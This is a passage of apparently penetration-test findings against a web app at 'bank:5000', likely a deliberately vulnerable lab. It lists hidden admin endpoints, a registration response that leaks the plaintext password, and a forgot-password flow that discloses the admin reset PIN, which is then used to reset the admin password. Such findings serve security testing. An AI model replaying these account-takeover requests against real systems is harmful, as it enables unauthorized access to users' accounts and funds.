5. Access /sup3r_s3cr3t_admin, /admin/create_admin, /admin/delete_account/{id}, /admin/approve_loan/{id}

1. POST http://bank:5000/register with body: {"username":"testuser","password":"MySecretPass"}
2. Response includes: {"debug_data": {"raw_data": {"password": "MySecretPass", "username": "testuser"}, "account_number": "XXXXXXXXXX", "user_id": N, "balance": 1000.0, "server_info": "curl/7.88.1"}}
3. Password is exposed in plaintext in the HTTP response body

1. POST http://bank:5000/api/v1/forgot-password with body: {"username":"admin"}
2. Response: {"debug_info": {"pin": "959", "pin_length": 3, "username": "admin"}}
3. POST http://bank:5000/api/v1/reset-password with body: {"username":"admin","reset_pin":"959","new_password":"NewPassword"}
